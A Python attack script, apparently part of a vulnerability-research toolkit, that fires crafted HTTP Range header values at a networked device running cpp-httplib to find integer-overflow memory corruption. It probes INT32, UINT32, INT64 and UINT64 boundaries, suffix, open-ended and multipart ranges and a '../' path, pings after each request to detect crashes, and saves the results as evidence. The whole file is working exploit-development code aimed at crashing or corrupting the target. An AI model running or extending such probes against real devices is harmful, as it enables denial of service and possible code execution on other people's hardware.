#!/usr/bin/env python3
"""
lp2p HTTP Range Precision Probe — test Range header values around
integer boundaries to find exploitable overflow vs DoS-only crash.

The goal: find a Range value that PASSES parsing but causes a memory
corruption in the length/offset calculation, not just an exception abort.

Key boundaries:
  INT32_MAX  = 2147483647
  UINT32_MAX = 4294967295
  SSIZE_MAX  = 9223372036854775807  (INT64_MAX)
  UINT64_MAX = 18446744073709551615

Usage:
    sudo python3 -Iu lp2p_http_range_probe.py --iface wlp5s0
"""

import subprocess
import socket
import time
import json
import sys
import argparse
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "lp2p_dhcp"
SWITCH_IP = "192.168.0.1"


def ping_alive():
    r = subprocess.run(["ping", "-c", "1", "-W", "2", SWITCH_IP],
                       capture_output=True)
    return r.returncode == 0


def raw_range_request(path, range_val, timeout=3):
    """Send raw HTTP with Range header, return (response_len, status_line, headers_str)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((SWITCH_IP, 80))
        req = (
            f"GET /{path} HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Range: bytes={range_val}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        sock.sendall(req.encode())
        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        if data:
            parts = data.split(b"\r\n\r\n", 1)
            headers = parts[0].decode("ascii", errors="replace")
            status = headers.split("\r\n")[0] if headers else "?"
            body_len = len(parts[1]) if len(parts) > 1 else 0
            return len(data), status, headers, body_len
        return 0, "NO_RESPONSE", "", 0
    except Exception as e:
        return 0, f"ERROR: {e}", "", 0
    finally:
        sock.close()


def test_range(label, range_val, path="data.json", delay=1.5):
    """Test one Range value with alive check."""
    if not ping_alive():
        print(f"  [SKIP] {label} — Switch unreachable")
        return {"label": label, "range": range_val, "status": "unreachable"}

    print(f"  [{label}] Range: bytes={range_val}  ", end="", flush=True)
    total, status, headers, body_len = raw_range_request(path, range_val)

    time.sleep(0.5)
    alive = ping_alive()

    entry = {
        "label": label,
        "range": range_val,
        "total_bytes": total,
        "status_line": status,
        "body_len": body_len,
        "alive_after": alive,
    }

    if not alive:
        print(f"→ CRASH!")
        print(f"      Waiting 25s...")
        time.sleep(25)
        entry["recovered_25s"] = ping_alive()
        if not entry["recovered_25s"]:
            print(f"      *** CONFIRMED DOWN ***")
        else:
            print(f"      Recovered")
    else:
        status_short = status.split(" ", 2)[1] if " " in status else status
        print(f"→ {status_short} (body={body_len}B) ping=OK")

    # Look for interesting headers
    if "Content-Range" in headers:
        for line in headers.split("\r\n"):
            if line.lower().startswith("content-range"):
                entry["content_range"] = line
                print(f"      {line}")

    time.sleep(delay)
    return entry


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--phase", type=int, default=0, help="Start from phase N")
    args = parser.parse_args()

    print("=" * 60)
    print("  lp2p HTTP Range Precision Probe")
    print("=" * 60)
    print(f"  Target: {SWITCH_IP}")
    print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
    print("=" * 60)

    if not ping_alive():
        print("[!] Switch not reachable")
        sys.exit(1)
    print("[+] Switch alive\n")

    results = []
    crashed = False

    def run(label, range_val, path="data.json"):
        nonlocal crashed
        if crashed:
            return
        r = test_range(label, range_val, path)
        results.append(r)
        if not r.get("alive_after", True):
            crashed = True

    # Phase 1: SSIZE_MAX boundary (is the type ssize_t or size_t?)
    if args.phase <= 1:
        print("--- Phase 1: SSIZE_MAX boundary ---")
        SMAX = 9223372036854775807  # INT64_MAX / SSIZE_MAX
        run("SMAX-2",   f"0-{SMAX-2}")
        run("SMAX-1",   f"0-{SMAX-1}")
        run("SMAX",     f"0-{SMAX}")
        run("SMAX+1",   f"0-{SMAX+1}")
        run("SMAX+2",   f"0-{SMAX+2}")
        run("SMAX*2",   f"0-{SMAX*2}")
        print()

    # Phase 2: INT32_MAX boundary (maybe 32-bit internally?)
    if args.phase <= 2 and not crashed:
        print("--- Phase 2: INT32_MAX boundary ---")
        I32MAX = 2147483647
        run("I32MAX-1", f"0-{I32MAX-1}")
        run("I32MAX",   f"0-{I32MAX}")
        run("I32MAX+1", f"0-{I32MAX+1}")
        run("I32MAX+2", f"0-{I32MAX+2}")
        U32MAX = 4294967295
        run("U32MAX-1", f"0-{U32MAX-1}")
        run("U32MAX",   f"0-{U32MAX}")
        run("U32MAX+1", f"0-{U32MAX+1}")
        print()

    # Phase 3: Length overflow — can we get length = 0 from valid range?
    # get_range_offset_and_length: length = (last - first) + 1
    # If last = UINT64_MAX and first = 0: length = UINT64_MAX + 1 = 0
    if args.phase <= 3 and not crashed:
        print("--- Phase 3: UINT64_MAX neighborhood ---")
        U64MAX = 18446744073709551615
        run("U64MAX-10", f"0-{U64MAX-10}")
        run("U64MAX-5",  f"0-{U64MAX-5}")
        run("U64MAX-2",  f"0-{U64MAX-2}")
        run("U64MAX-1",  f"0-{U64MAX-1}")
        # This is the known crash — skip or use as confirmation
        # run("U64MAX",    f"0-{U64MAX}")
        print()

    # Phase 4: Non-zero start values to control length
    if args.phase <= 4 and not crashed:
        print("--- Phase 4: Non-zero start (length manipulation) ---")
        SMAX = 9223372036854775807
        # start=1, end=SMAX → length = SMAX
        run("1-SMAX",   f"1-{SMAX}")
        # start=SMAX, end=SMAX → length = 1
        run("SMAX-SMAX", f"{SMAX}-{SMAX}")
        # Try to get length calculation to overflow
        # length = (end - start) + 1
        # If end = SMAX and start = 0: length = SMAX + 1 (wraps to -SMAX-1 in signed)
        run("0-SMAX+1", f"0-{SMAX+1}")
        # start=SMAX-1, end = UINT64_MAX-1 → tests how subtraction works
        run("SMAX-1_to_U64MAX-1", f"{SMAX-1}-{U64MAX-1}")
        print()

    # Phase 5: Multipart ranges (different code path)
    if args.phase <= 5 and not crashed:
        print("--- Phase 5: Multipart range with boundary values ---")
        SMAX = 9223372036854775807
        run("multi_0-0,SMAX-SMAX", f"0-0,{SMAX}-{SMAX}")
        run("multi_0-100,SMAX-1_to_SMAX", f"0-100,{SMAX-1}-{SMAX}")
        # Multiple ranges that together span a huge region
        run("multi_0-0,0-0_x20", "0-0," * 19 + "0-0")
        # 500 ranges
        run("multi_500_ranges", ",".join(f"{i}-{i}" for i in range(500)))
        # 1024 ranges (CPPHTTPLIB_RANGE_MAX_COUNT)
        run("multi_1024_ranges", ",".join(f"{i}-{i}" for i in range(1024)))
        # 1025 ranges (above limit)
        run("multi_1025_ranges", ",".join(f"{i}-{i}" for i in range(1025)))
        print()

    # Phase 6: Suffix ranges (e.g., bytes=-500)
    if args.phase <= 6 and not crashed:
        print("--- Phase 6: Suffix ranges ---")
        SMAX = 9223372036854775807
        run("suffix_-100", "-100")
        run("suffix_-0", "-0")
        run("suffix_-SMAX", f"-{SMAX}")
        run("suffix_-SMAX+1", f"-{SMAX+1}")
        run("suffix_-U64MAX", f"-{U64MAX}")
        print()

    # Phase 7: Open-ended ranges
    if args.phase <= 7 and not crashed:
        print("--- Phase 7: Open-ended ranges ---")
        SMAX = 9223372036854775807
        run("open_0-", "0-")
        run("open_SMAX-", f"{SMAX}-")
        run("open_SMAX+1-", f"{SMAX+1}-")
        print()

    # Phase 8: Signed/unsigned confusion — negative-looking values
    if args.phase <= 8 and not crashed:
        print("--- Phase 8: Edge values ---")
        # These might trigger different parsing behavior
        run("start_neg1", "0--1")
        run("both_zero", "0-0")
        # Content-Range with file request (larger body)
        run("img_0-100", "0-100", path="img/../data.json")
        print()

    # Save results
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "range_probe_results.json"
    with open(path, "w") as f:
        json.dump({
            "test": "http_range_precision_probe",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "firmware": "22.5.0",
            "library": "cpp-httplib",
            "results": results,
            "crashed": crashed,
        }, f, indent=2, default=str)
    print(f"\nEvidence saved: {path}")

    # Summary
    print("\n" + "=" * 60)
    crashes = [r for r in results if not r.get("alive_after", True)]
    if crashes:
        print(f"  CRASHES: {len(crashes)}")
        for c in crashes:
            print(f"    {c['label']}: Range: bytes={c['range'][:60]}...")
    else:
        print(f"  No crashes in {len(results)} tests")

    statuses = {}
    for r in results:
        s = r.get("status_line", "?").split(" ", 2)[1] if " " in r.get("status_line", "") else "?"
        statuses.setdefault(s, []).append(r["label"])
    print(f"  Status distribution:")
    for s, labels in sorted(statuses.items()):
        print(f"    {s}: {len(labels)} tests")
    print("=" * 60)


if __name__ == "__main__":
    U64MAX = 18446744073709551615
    main()
